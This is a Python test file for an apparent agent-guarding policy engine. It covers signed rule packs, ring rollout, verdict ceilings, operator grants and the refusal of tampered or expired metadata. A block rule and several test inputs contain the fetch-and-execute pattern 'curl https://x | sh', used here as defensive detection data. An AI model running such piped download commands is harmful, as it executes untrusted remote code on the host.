"""Phase 0 end to end: a maintainer publishes a commons, a node subscribes over a
``file://`` mirror, and ``"extends": "mesh:<pack>@<ring>"`` installs the pack
with rings, ceilings and the monitor window applied. Then every way the node
must refuse: tampered bytes, a stale timestamp, a pack that is not cached."""
import json
import os
import time

import pytest

from interlock import SensorEvent, Verdict
from interlock.mesh import catalog, metadata
from interlock.mesh.bundle import DEFAULT_CEILINGS, PackError, apply_ring, check_grants, normalize_pack, rule_digest
from interlock.mesh.repository import PublishError, init_keys, load_signers, publish, verify_site
from interlock.mesh.subscriber import Subscriber, SubscriberError, parse_spec
from interlock.policy.declarative import PolicyError, load_policy, load_policy_file

PACK = {
    "version": 1,
    "name": "coding-agent-commons",
    "channel": "coding-agent",
    "rules": [
        {"id": "no-curl-pipe-sh", "verdict": "block", "status": "stable",
         "reason": "piping a download into a shell",
         "when": {"arg": "command", "matches": r"curl[^|]*\|\s*(ba)?sh"}},
        {"id": "big-payments", "verdict": "block", "status": "test",
         "reason": "large payment", "when": {"arg": "amount", "gt": 1000}},
        {"id": "new-idea", "verdict": "block", "status": "experimental",
         "reason": "experimental", "when": {"arg": "x", "eq": "danger"}},
        {"id": "old", "verdict": "block", "status": "deprecated", "when": {"arg": "x", "eq": "old"}},
    ],
}


def ev(**args):
    return SensorEvent(action="Bash", args=args, principal="p")


@pytest.fixture
def commons(tmp_path):
    source = tmp_path / "commons"
    (source / "packs").mkdir(parents=True)
    (source / "packs" / "coding-agent.json").write_text(json.dumps(PACK))
    keys = tmp_path / "keys"
    init_keys(str(keys))
    site = tmp_path / "site"
    result = publish(str(source), str(site), str(keys))
    return {"source": source, "keys": keys, "site": site, "publish": result, "tmp": tmp_path}


@pytest.fixture
def node(commons, monkeypatch):
    mesh_dir = commons["tmp"] / "mesh"
    monkeypatch.setenv("INTERLOCK_MESH_DIR", str(mesh_dir))
    root = (commons["site"] / "metadata" / "1.root.json").read_bytes()
    sub = Subscriber(str(mesh_dir))
    sub.init(root, ["file://" + str(commons["site"])], ring="canary", monitor_days=0)
    sub.sync()
    return sub


# --- publishing -----------------------------------------------------------------


def test_publish_writes_a_verifiable_site(commons):
    result = commons["publish"]
    assert result["root_version"] == 1 and result["targets_version"] == 1
    assert "packs/coding-agent.json" in result["packs"]
    assert result["packs"]["packs/coding-agent.json"]["statuses"] == {
        "deprecated": 1, "experimental": 1, "stable": 1, "test": 1}
    walked = verify_site(str(commons["site"]))
    assert walked["targets"] == ["packs/coding-agent.json"]
    # Publishing again bumps every version but keeps the root.
    again = publish(str(commons["source"]), str(commons["site"]), str(commons["keys"]))
    assert again["root_version"] == 1 and not again["root_changed"]
    assert again["targets_version"] == 2 and again["timestamp_version"] == 2
    assert verify_site(str(commons["site"]))["timestamp_version"] == 2


def test_publish_refuses_a_pack_with_a_quarantined_rule(tmp_path):
    source = tmp_path / "c"
    (source / "packs").mkdir(parents=True)
    bad = {"version": 1, "rules": [{"id": "r", "verdict": "block", "when": {"arg": "a", "equals": 1}}]}
    (source / "packs" / "bad.json").write_text(json.dumps(bad))
    init_keys(str(tmp_path / "k"))
    with pytest.raises(PublishError) as err:
        publish(str(source), str(tmp_path / "s"), str(tmp_path / "k"))
    assert "quarantined" in str(err.value)


def test_publish_refuses_locked_rules_and_subscriber_keys():
    with pytest.raises(PackError):
        normalize_pack({"version": 1, "rules": [{"id": "r", "verdict": "block", "mode": "shadow", "when": {"arg": "a", "eq": 1}}]})
    # A pack cannot claim the mesh origin either: only the subscriber stamps it.
    with pytest.raises(PackError):
        normalize_pack({"version": 1, "rules": [{"id": "r", "verdict": "block", "origin": "mesh", "when": {"arg": "a", "eq": 1}}]})
    doc = normalize_pack({"version": 1, "rules": [{"id": "r", "verdict": "block", "locked": True, "when": {"arg": "a", "eq": 1}}]})
    assert "locked" not in doc["rules"][0] and doc["rules"][0]["status"] == "experimental"
    with pytest.raises(PackError):
        normalize_pack({"version": 1, "extends": "builtin:coding-agent", "rules": [{"id": "r", "verdict": "block", "when": {"arg": "a", "eq": 1}}]})


def test_keys_are_private_and_not_overwritten(tmp_path):
    keys = tmp_path / "keys"
    init_keys(str(keys), counts={"root": 3}, thresholds={"root": 2})
    files = sorted(os.listdir(keys))
    assert files == ["log.1.json", "roles.json", "root.1.json", "root.2.json", "root.3.json", "snapshot.1.json",
                     "targets.1.json", "timestamp.1.json"]
    assert oct(os.stat(keys / "root.1.json").st_mode & 0o777) == "0o600"
    with pytest.raises(PublishError):
        init_keys(str(keys))


# --- subscribing ---------------------------------------------------------------------


def test_sync_then_resolve_applies_ring_and_ceilings(node):
    status = node.status()
    assert status["root_version"] == 1 and not status["timestamp_expired"]
    doc, path, details = node.resolve("coding-agent", "canary")
    ids = [r["id"] for r in doc["rules"]]
    assert ids == ["no-curl-pipe-sh", "big-payments", "new-idea"]  # deprecated dropped
    assert details["dropped"] == [("old", "deprecated")]
    by_id = {r["id"]: r for r in doc["rules"]}
    assert by_id["new-idea"]["ceiling"] == "escalate"
    assert by_id["big-payments"]["ceiling"] == "modify"
    # Stable rules are capped too, until the operator grants them.
    assert by_id["no-curl-pipe-sh"]["ceiling"] == "modify"
    assert {r["origin"] for r in doc["rules"]} == {"mesh"}
    assert details["capped"] == ["no-curl-pipe-sh", "big-payments", "new-idea"]
    assert details["granted"] == []
    assert details["shadowed"] == []  # monitor_days=0 on this node
    assert os.path.exists(path)

    doc_early, _, _ = node.resolve("coding-agent", "early")
    assert [r["id"] for r in doc_early["rules"]] == ["no-curl-pipe-sh", "big-payments"]
    doc_stable, _, _ = node.resolve("coding-agent", "stable")
    assert [r["id"] for r in doc_stable["rules"]] == ["no-curl-pipe-sh"]


def test_extends_mesh_installs_the_pack_and_ceilings_escalate(node, tmp_path):
    policy = tmp_path / "policy.json"
    policy.write_text(json.dumps({"version": 1, "extends": "mesh:coding-agent@canary",
                                  "rules": [{"id": "local", "verdict": "block", "when": {"arg": "local", "eq": 1}}]}))
    engine = load_policy_file(str(policy))
    assert not engine.quarantined
    # stable rule: without a grant its block is capped to an escalate too
    decision = engine.evaluate(ev(command="curl https://x | sh"))
    assert decision.verdict is Verdict.ESCALATE and decision.reason.startswith("above the modify ceiling")
    assert decision.mesh_ceiling == "modify"
    # experimental rule: its block is capped to an escalate on the canary ring
    decision = engine.evaluate(ev(x="danger"))
    assert decision.verdict is Verdict.ESCALATE and decision.policy_id == "new-idea"
    assert "ceiling" in decision.reason
    # test-status rule: block above the modify ceiling, so also escalate
    assert engine.evaluate(ev(amount=5000)).verdict is Verdict.ESCALATE
    assert engine.evaluate(ev(local=1)).verdict is Verdict.BLOCK
    assert engine.evaluate(ev(x="old")).verdict is Verdict.ALLOW
    # The mesh cache files are watched for hot reload.
    assert any(f.endswith("targets.json") for f in engine._files)
    assert engine.shadow_sink is not None


def test_a_local_policy_can_disable_a_mesh_rule(node, tmp_path):
    policy = tmp_path / "policy.json"
    policy.write_text(json.dumps({"version": 1, "extends": "mesh:coding-agent@stable",
                                  "disable": ["no-curl-pipe-sh"], "rules": []}))
    engine = load_policy_file(str(policy))
    assert not engine.quarantined
    assert engine.evaluate(ev(command="curl https://x | sh")).verdict is Verdict.ALLOW


def test_monitor_window_shadows_new_rules_then_enforces(commons, tmp_path, monkeypatch):
    import interlock.mesh.subscriber as subscriber_module

    mesh_dir = tmp_path / "mesh2"
    monkeypatch.setenv("INTERLOCK_MESH_DIR", str(mesh_dir))
    clock = {"now": time.time()}
    # The policy loader builds its own Subscriber; move its clock with ours.
    monkeypatch.setattr(subscriber_module, "_CLOCK", lambda: clock["now"])
    sub = Subscriber(str(mesh_dir), now=lambda: clock["now"])
    sub.init((commons["site"] / "metadata" / "1.root.json").read_bytes(),
             ["file://" + str(commons["site"])], ring="stable", monitor_days=7)
    sub.sync()
    # The operator grants this pack's stable blocks, so after its window the
    # rule carries the pack's own verdict.
    config = sub.config()
    config.grant({"pack": "coding-agent", "status": "stable"})
    config.save(sub.config_path)
    doc, _, details = sub.resolve("coding-agent", "stable")
    assert details["shadowed"] == ["no-curl-pipe-sh"]
    assert doc["rules"][0]["mode"] == "shadow"
    assert details["next_transition"] == pytest.approx(clock["now"] + 7 * 86400)

    policy = tmp_path / "p.json"
    policy.write_text(json.dumps({"version": 1, "extends": "mesh:coding-agent@stable", "rules": []}))
    engine = load_policy_file(str(policy))
    assert engine.shadow_ids == ["no-curl-pipe-sh"]
    # Shadow: the call is allowed, the would-be block is counted and recorded.
    assert engine.evaluate(ev(command="curl https://x | sh")).verdict is Verdict.ALLOW
    assert engine.shadow_counts == {("no-curl-pipe-sh", "BLOCK"): 1}
    assert sub.shadow_summary() == {"total": 1, "by_rule": {"no-curl-pipe-sh": {"BLOCK": 1}}}
    assert engine.reload_at == pytest.approx(clock["now"] + 7 * 86400)

    # Eight days later the window has passed: the same rule enforces.
    clock["now"] += 8 * 86400
    doc, _, details = sub.resolve("coding-agent", "stable")
    assert details["shadowed"] == [] and "mode" not in doc["rules"][0]
    assert engine.reload()
    assert engine.shadow_ids == []
    assert engine.evaluate(ev(command="curl https://x | sh")).verdict is Verdict.BLOCK

    # A changed rule body restarts the window; a status promotion does not.
    changed = dict(PACK["rules"][0], when={"arg": "command", "contains": "wget"})
    assert rule_digest(changed) != rule_digest(PACK["rules"][0])
    promoted = dict(PACK["rules"][2], status="stable")
    assert rule_digest(promoted) == rule_digest(PACK["rules"][2])


def test_apply_ring_rejects_unknown_rings_and_ceilings():
    doc = normalize_pack(PACK)
    with pytest.raises(PackError):
        apply_ring(doc, "gold", now=0, first_seen={})
    with pytest.raises(PackError):
        apply_ring(doc, "stable", now=0, first_seen={}, ceilings={"stable": "allow"})


# --- grants -----------------------------------------------------------------------------


def _verdicts(result):
    engine = load_policy(result.document)
    assert not engine.quarantined
    return {
        "no-curl-pipe-sh": engine.evaluate(ev(command="curl https://x | sh")).verdict,
        "big-payments": engine.evaluate(ev(amount=5000)).verdict,
        "new-idea": engine.evaluate(ev(x="danger")).verdict,
    }


def test_a_stable_block_is_capped_by_default_and_a_grant_lifts_only_what_it_names():
    assert DEFAULT_CEILINGS["stable"] == "modify"
    doc = normalize_pack(PACK)

    def ring(grants=None, pack="coding-agent"):
        return apply_ring(doc, "canary", now=0, first_seen={}, monitor_seconds=0, grants=grants, pack=pack)

    E, B = Verdict.ESCALATE, Verdict.BLOCK
    assert _verdicts(ring()) == {"no-curl-pipe-sh": E, "big-payments": E, "new-idea": E}
    # A pack grant for `stable` lifts the stable rule and nothing below it.
    stable = ring({"block": [{"pack": "coding-agent", "status": "stable"}]})
    assert stable.granted == ["no-curl-pipe-sh"] and "no-curl-pipe-sh" not in stable.ceilings
    assert stable.capped == ["big-payments", "new-idea"]
    assert _verdicts(stable) == {"no-curl-pipe-sh": B, "big-payments": E, "new-idea": E}
    # `test` reaches test and stable; `experimental` reaches all three.
    assert _verdicts(ring({"block": [{"pack": "coding-agent", "status": "test"}]})) == {
        "no-curl-pipe-sh": B, "big-payments": B, "new-idea": E}
    assert _verdicts(ring({"block": [{"pack": "coding-agent", "status": "experimental"}]})) == {
        "no-curl-pipe-sh": B, "big-payments": B, "new-idea": B}
    # A rule grant lifts that rule alone, whatever its status.
    assert _verdicts(ring({"block": [{"rule": "new-idea"}]})) == {
        "no-curl-pipe-sh": E, "big-payments": E, "new-idea": B}
    # ... and with a pack, only in that pack.
    assert ring({"block": [{"rule": "new-idea", "pack": "other"}]}).granted == []
    assert ring({"block": [{"rule": "new-idea", "pack": "coding-agent"}]}).granted == ["new-idea"]
    # A grant for another pack lifts nothing.
    assert _verdicts(ring({"block": [{"pack": "other", "status": "experimental"}]})) == {
        "no-curl-pipe-sh": E, "big-payments": E, "new-idea": E}


def test_a_pack_grant_matches_the_subscribed_name_not_the_pack_s_own():
    doc = normalize_pack(PACK)  # its "name" is coding-agent-commons, its author's choice
    forged = {"block": [{"pack": "coding-agent-commons", "status": "stable"}]}
    assert apply_ring(doc, "stable", now=0, first_seen={}, grants=forged, pack="coding-agent").granted == []
    # With no subscribed name (a direct call), the document's name is all there is.
    assert apply_ring(doc, "stable", now=0, first_seen={}, grants=forged).granted == ["no-curl-pipe-sh"]


def test_origin_and_grants_do_not_restart_the_monitor_window():
    doc = normalize_pack(PACK)
    first_seen = {}
    apply_ring(doc, "stable", now=0, first_seen=first_seen, monitor_seconds=100)
    granted = apply_ring(doc, "stable", now=50, first_seen=first_seen, monitor_seconds=100,
                         grants={"block": [{"rule": "no-curl-pipe-sh"}]})
    assert first_seen["no-curl-pipe-sh"]["since"] == 0
    assert granted.shadowed == ["no-curl-pipe-sh"] and granted.next_transition == 100


@pytest.mark.parametrize("bad", [
    [], {"allow": []}, {"block": {}}, {"block": ["x"]}, {"block": [{"pack": "p"}]},
    {"block": [{"pack": "p", "status": "deprecated"}]}, {"block": [{"rule": "r", "status": "stable"}]},
    {"block": [{"rule": ""}]}, {"block": [{"rule": "r", "extra": 1}]},
])
def test_malformed_grants_are_refused(bad):
    with pytest.raises(PackError):
        check_grants(bad)


def test_grants_persist_in_config_json_and_resolve_honours_them(node):
    config = node.config()
    assert config.grants == {"block": []}
    assert config.grant({"pack": "coding-agent", "status": "stable"})
    assert config.grant({"rule": "big-payments"})
    assert not config.grant({"rule": "big-payments"})  # no duplicate
    config.save(node.config_path)
    raw = json.loads(open(node.config_path).read())
    assert raw["grants"] == {"block": [{"pack": "coding-agent", "status": "stable"}, {"rule": "big-payments"}]}

    doc, _, details = node.resolve("coding-agent", "canary")
    assert details["granted"] == ["no-curl-pipe-sh", "big-payments"]
    assert details["capped"] == ["new-idea"]
    by_id = {r["id"]: r for r in doc["rules"]}
    assert "ceiling" not in by_id["no-curl-pipe-sh"] and "ceiling" not in by_id["big-payments"]

    config = node.config()
    assert config.revoke({"pack": "coding-agent", "status": "stable"})
    assert not config.revoke({"pack": "coding-agent", "status": "stable"})
    config.save(node.config_path)
    _, _, details = node.resolve("coding-agent", "canary")
    assert details["granted"] == ["big-payments"]


def test_a_malformed_grant_in_config_json_fails_closed(node):
    raw = json.loads(open(node.config_path).read())
    raw["grants"] = {"block": [{"pack": "coding-agent"}]}
    open(node.config_path, "w").write(json.dumps(raw))
    with pytest.raises(SubscriberError) as err:
        node.resolve("coding-agent", "canary")
    assert "grants.block[0]" in str(err.value)
    with pytest.raises(PolicyError):
        load_policy({"version": 1, "extends": "mesh:coding-agent@canary", "rules": []})


def test_a_config_written_before_grants_reads_as_the_new_defaults(node):
    raw = json.loads(open(node.config_path).read())
    raw.pop("grants")
    raw["ceilings"] = {"experimental": "escalate", "test": "modify", "stable": None}  # what init used to write
    open(node.config_path, "w").write(json.dumps(raw))
    assert node.config().ceilings["stable"] == "modify"
    doc, _, details = node.resolve("coding-agent", "stable")
    assert doc["rules"][0]["ceiling"] == "modify" and details["capped"] == ["no-curl-pipe-sh"]
    # An operator's own ceilings are kept as written.
    raw["ceilings"] = {"stable": None}
    open(node.config_path, "w").write(json.dumps(raw))
    assert node.config().ceilings == {"stable": None}


def test_a_grant_reloads_a_watched_policy(node, tmp_path):
    policy = tmp_path / "policy.json"
    policy.write_text(json.dumps({"version": 1, "extends": "mesh:coding-agent@stable", "rules": []}))
    engine = load_policy_file(str(policy), watch=0)
    assert node.config_path in engine._files
    assert engine.evaluate(ev(command="curl https://x | sh")).verdict is Verdict.ESCALATE
    config = node.config()
    config.grant({"pack": "coding-agent", "status": "stable"})
    config.save(node.config_path)
    os.utime(node.config_path, (time.time() + 5, time.time() + 5))
    assert engine.evaluate(ev(command="curl https://x | sh")).verdict is Verdict.BLOCK


def test_grant_cli_round_trip(node, capsys):
    from interlock.cli import main

    def resolved():
        assert main(["mesh", "resolve", "mesh:coding-agent@stable"]) == 0
        return json.loads(capsys.readouterr().out)

    assert main(["mesh", "grant", "--list"]) == 0
    assert "no grants" in capsys.readouterr().out
    assert resolved()["document"]["rules"][0]["ceiling"] == "modify"

    assert main(["mesh", "grant", "block", "--pack", "coding-agent", "--status", "stable"]) == 0
    assert "granted: block pack coding-agent, status stable and above" in capsys.readouterr().out
    assert main(["mesh", "grant", "block", "--rule", "new-idea"]) == 0
    capsys.readouterr()
    assert main(["mesh", "grant", "--list"]) == 0
    assert capsys.readouterr().out.splitlines() == [
        "block pack coding-agent, status stable and above", "block rule new-idea in any pack"]
    out = resolved()
    assert out["granted"] == ["no-curl-pipe-sh"] and "ceiling" not in out["document"]["rules"][0]

    assert main(["mesh", "grant", "revoke", "--pack", "coding-agent", "--status", "stable"]) == 0
    assert "revoked" in capsys.readouterr().out
    assert main(["mesh", "grant", "revoke", "--pack", "coding-agent", "--status", "stable"]) == 2
    assert "no such grant" in capsys.readouterr().err
    out = resolved()
    assert out["granted"] == [] and out["document"]["rules"][0]["ceiling"] == "modify"
    assert main(["mesh", "grant", "--list", "--dir", node.dir]) == 0
    assert capsys.readouterr().out.splitlines() == ["block rule new-idea in any pack"]

    # --pack alone means status stable; the command line is checked.
    assert main(["mesh", "grant", "block", "--dir", node.dir, "--pack", "coding-agent"]) == 0
    assert node.config().grants["block"][-1] == {"pack": "coding-agent", "status": "stable"}
    capsys.readouterr()
    assert main(["mesh", "grant"]) == 64
    assert main(["mesh", "grant", "block"]) == 64
    assert main(["mesh", "grant", "block", "--rule", "r", "--status", "test"]) == 64


def test_status_and_doctor_report_capped_rules(node, capsys):
    from interlock.cli import main
    from interlock.cli.doctor import _mesh_checks

    node.resolve("coding-agent", "canary")
    node.resolve("coding-agent", "stable")  # the same rule on another ring counts once
    assert node.status()["capped"] == 3
    checks = {c.id: c for c in _mesh_checks()}
    assert checks["mesh.capped"].summary == "3 mesh rules capped at escalate; no approver installed: shadow only"
    assert checks["mesh.capped"].status == "info"
    main(["mesh", "status"])
    assert "3 mesh rules capped at escalate; no approver installed: shadow only" in capsys.readouterr().out

    config = node.config()
    config.grant({"pack": "coding-agent", "status": "experimental"})
    config.save(node.config_path)
    node.resolve("coding-agent", "canary")
    node.resolve("coding-agent", "stable")
    assert node.status()["capped"] == 0
    assert "mesh.capped" not in {c.id for c in _mesh_checks()}


# --- refusing --------------------------------------------------------------------------


def test_tampered_pack_bytes_are_refused_on_resolve(node):
    targets_dir = os.path.join(node.dir, "targets", "packs")
    (blob,) = os.listdir(targets_dir)
    path = os.path.join(targets_dir, blob)
    data = json.loads(open(path).read())
    data["rules"][0]["when"] = {"arg": "command", "eq": "never"}
    with open(path, "w") as fh:
        fh.write(json.dumps(data))
    with pytest.raises(SubscriberError) as err:
        node.resolve("coding-agent", "canary")
    assert "does not verify" in str(err.value)
    # ... and the loader fails closed rather than installing it.
    with pytest.raises(PolicyError):
        load_policy({"version": 1, "extends": "mesh:coding-agent@canary", "rules": []})
    # sync repairs the cache from the mirror.
    result = node.sync()
    assert result["fetched"] == ["packs/coding-agent.json"]
    node.resolve("coding-agent", "canary")


def test_sync_against_a_tampered_site_leaves_the_cache_unchanged(node, commons):
    before = node.status()
    ts_path = commons["site"] / "metadata" / "timestamp.json"
    env = json.loads(ts_path.read_text())
    env["signed"]["version"] += 5
    ts_path.write_text(json.dumps(env))
    with pytest.raises(SubscriberError) as err:
        node.sync()
    assert "signatures" in str(err.value)
    after = node.status()
    assert after["last_error"] and after["root_version"] == before["root_version"]
    node.resolve("coding-agent", "canary")  # the last good cache still serves


def test_missing_pack_fails_closed_and_unconfigured_is_an_error(node, tmp_path, monkeypatch):
    with pytest.raises(SubscriberError) as err:
        node.resolve("no-such-pack")
    assert "interlock mesh sync" in str(err.value)
    with pytest.raises(PolicyError):
        load_policy({"version": 1, "extends": "mesh:no-such-pack", "rules": []})
    monkeypatch.setenv("INTERLOCK_MESH_DIR", str(tmp_path / "empty"))
    with pytest.raises(PolicyError) as err:
        load_policy({"version": 1, "extends": "mesh:coding-agent", "rules": []})
    assert "not configured" in str(err.value)


def test_stale_timestamp_is_reported_but_last_good_pack_still_resolves(commons, tmp_path):
    mesh_dir = tmp_path / "mesh3"
    clock = {"now": time.time()}
    sub = Subscriber(str(mesh_dir), now=lambda: clock["now"])
    sub.init((commons["site"] / "metadata" / "1.root.json").read_bytes(),
             ["file://" + str(commons["site"])], ring="stable", monitor_days=0)
    sub.sync()
    clock["now"] += 3 * 86400  # the one-day timestamp is now expired
    status = sub.status()
    assert status["timestamp_expired"] is True
    doc, _, _ = sub.resolve("coding-agent", "stable")
    assert doc["rules"]
    with pytest.raises(SubscriberError) as err:
        sub.sync()
    assert "expired" in str(err.value)


def test_root_rotation_is_followed_by_the_subscriber(commons, node):
    keys = commons["keys"]
    retired = keys / "retired"
    retired.mkdir()
    (keys / "root.1.json").rename(retired / "root.1.json")
    init_keys_dir = commons["tmp"] / "newroot"
    init_keys(str(init_keys_dir))
    (init_keys_dir / "root.1.json").rename(keys / "root.1.json")
    result = publish(str(commons["source"]), str(commons["site"]), str(commons["keys"]))
    assert result["root_version"] == 2 and result["root_changed"]
    synced = node.sync()
    assert synced["root_version"] == 2
    assert node.status()["root_version"] == 2
    assert verify_site(str(commons["site"]))["root_version"] == 2


# --- an offline root -------------------------------------------------------------------


def take_root_offline(commons):
    """Move the root key file out of keys/, the way a real commons keeps it."""
    offline = commons["tmp"] / "offline"
    offline.mkdir(exist_ok=True)
    (commons["keys"] / "root.1.json").rename(offline / "root.1.json")
    return offline / "root.1.json"


def test_publish_needs_no_root_key_while_the_root_is_current(commons, node):
    take_root_offline(commons)
    signers, _ = load_signers(str(commons["keys"]))
    assert signers["root"] == [] and signers["timestamp"]
    again = publish(str(commons["source"]), str(commons["site"]), str(commons["keys"]))
    assert again["root_version"] == 1 and not again["root_changed"] and again["warnings"] == []
    assert again["targets_version"] == 2 and again["timestamp_version"] == 2
    assert verify_site(str(commons["site"]))["timestamp_version"] == 2
    assert node.sync()["timestamp_version"] == 2


def test_publish_without_root_keys_refuses_when_a_new_root_is_needed(commons, tmp_path):
    take_root_offline(commons)
    keys = commons["keys"]
    # The online timestamp key is replaced: the root has to say so, and nobody here can sign that.
    fresh = tmp_path / "fresh"
    init_keys(str(fresh))
    (fresh / "timestamp.1.json").replace(keys / "timestamp.1.json")
    before = (commons["site"] / "metadata" / "timestamp.json").read_bytes()
    with pytest.raises(PublishError) as err:
        publish(str(commons["source"]), str(commons["site"]), str(keys))
    message = str(err.value)
    assert "timestamp" in message and "0 of the 1 root key(s)" in message and "root ceremony" in message
    assert (commons["site"] / "metadata" / "timestamp.json").read_bytes() == before  # nothing written


def test_publish_without_root_keys_refuses_an_expired_root_and_a_first_root(commons, tmp_path):
    take_root_offline(commons)
    with pytest.raises(PublishError) as err:
        publish(str(commons["source"]), str(commons["site"]), str(commons["keys"]),
                now=time.time() + 198 * 86400)
    assert "expired" in str(err.value) and "root ceremony" in str(err.value)
    with pytest.raises(PublishError) as err:
        publish(str(commons["source"]), str(tmp_path / "new-site"), str(commons["keys"]))
    assert "no root yet" in str(err.value)


def test_publish_warns_inside_the_root_signing_period(commons):
    later = time.time() + metadata.DEFAULT_EXPIRY["root"] - 30 * 86400  # 30 days left, inside the 46
    offline_key = take_root_offline(commons)
    result = publish(str(commons["source"]), str(commons["site"]), str(commons["keys"]), now=later)
    assert result["root_version"] == 1 and not result["root_changed"]
    assert len(result["warnings"]) == 1 and "signing period" in result["warnings"][0]
    # With the root key at hand, publish signs the next root itself instead.
    offline_key.rename(commons["keys"] / "root.1.json")
    result = publish(str(commons["source"]), str(commons["site"]), str(commons["keys"]), now=later)
    assert result["root_version"] == 2 and result["root_changed"] and result["warnings"] == []


def test_doctor_reports_a_root_in_its_signing_period_and_an_expired_root(tmp_path, monkeypatch):
    from interlock.cli.doctor import _mesh_checks

    source = tmp_path / "commons"
    (source / "packs").mkdir(parents=True)
    (source / "packs" / "coding-agent.json").write_text(json.dumps(PACK))
    init_keys(str(tmp_path / "keys"))

    def root_check(name, **publish_kw):
        site = tmp_path / ("site-" + name)
        publish(str(source), str(site), str(tmp_path / "keys"), **publish_kw)
        mesh_dir = tmp_path / ("mesh-" + name)
        Subscriber(str(mesh_dir)).init((site / "metadata" / "1.root.json").read_bytes(), ["file://" + str(site)])
        monkeypatch.setenv("INTERLOCK_MESH_DIR", str(mesh_dir))
        return {c.id: c for c in _mesh_checks()}["mesh.root"]

    assert root_check("healthy").status == "ok"
    due = root_check("due", expiry={"root": 30 * 86400})
    assert due.status == "warn" and "signing period" in due.summary
    expired = root_check("expired", now=time.time() - metadata.DEFAULT_EXPIRY["root"] - 86400)
    assert expired.status == "fail" and "expired" in expired.summary and expired.fix


def test_parse_spec():
    assert parse_spec("mesh:coding-agent") == ("coding-agent", "stable")
    assert parse_spec("mesh:coding-agent@early") == ("coding-agent", "early")
    for bad in ("coding-agent", "mesh:", "mesh:../x", "mesh:a@gold", "mesh:a/b"):
        with pytest.raises(SubscriberError):
            parse_spec(bad)


def test_oversized_pack_is_refused(commons, node):
    node_config = json.loads(open(node.config_path).read())
    node_config["max_bundle_bytes"] = 10
    open(node.config_path, "w").write(json.dumps(node_config))
    with pytest.raises(SubscriberError) as err:
        node.sync()
    assert "above the configured" in str(err.value)


# --- catalog ------------------------------------------------------------------------------


def test_catalog_id_is_stable_and_stamped_on_receipts():
    a = catalog.catalog_id()
    assert len(a) == 16 and a == catalog.catalog_id()
    assert catalog.catalog_id(refresh=True) == a
    from interlock import receipt as receipt_mod
    from interlock.sink import InMemorySink

    sink = InMemorySink()
    receipt_mod.set_sink(sink)
    try:
        receipt_mod.set_catalog_id(a)
        from interlock import Decision
        receipt_mod.emit_receipt(SensorEvent(action="t", args={}), Decision.block("no", "r"))
        assert sink._read_back()[-1].catalog == a
        receipt_mod.set_catalog_id(None)
        receipt_mod.emit_receipt(SensorEvent(action="t", args={}), Decision.block("no", "r"))
        assert "catalog" not in sink._read_back()[-1].fields()
    finally:
        receipt_mod.set_catalog_id(None)
        receipt_mod.set_sink(None)


def test_metadata_default_lengths_cover_real_documents(commons):
    for name, role in (("timestamp.json", "timestamp"), ("snapshot.json", "snapshot"), ("targets.json", "targets"), ("root.json", "root")):
        size = os.path.getsize(commons["site"] / "metadata" / name)
        assert size < metadata.MAX_LENGTH[role]
